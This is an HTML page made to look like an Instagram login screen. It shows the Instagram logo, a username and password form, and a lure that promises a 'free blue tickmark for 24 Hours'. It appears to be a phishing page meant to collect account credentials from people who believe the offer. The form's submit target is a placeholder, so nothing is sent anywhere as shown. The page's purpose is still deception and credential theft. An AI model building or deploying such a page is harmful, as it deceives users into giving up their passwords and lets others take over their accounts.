<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #fafafa;
    }

    .container {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      padding: 20px;
      width: 300px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    input[type="text"],
    input[type="password"],
    input[type="submit"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      box-sizing: border-box;
    }

    input[type="submit"] {
      background-color: #3897f0;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
    }

    input[type="submit"]:hover {
      background-color: #3478d0;
    }
    img{
        width: 145px;
        bottom: 20px;
        margin-left: 74px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="image"><img src="instagram-logo-png-transparent-background.png"></div>
    <h2>Instagram Login</h2>
    <h4 style="margin-left: 10px;">get free blue tickmark for 24 Hours !</h4>
    <form action="#" method="post">
      <input type="text" name="username" placeholder="Username or Email">
      <input type="password" name="password" placeholder="Password">
      <input type="submit" value="Submit">
    </form>
  </div>
</body>
</html>
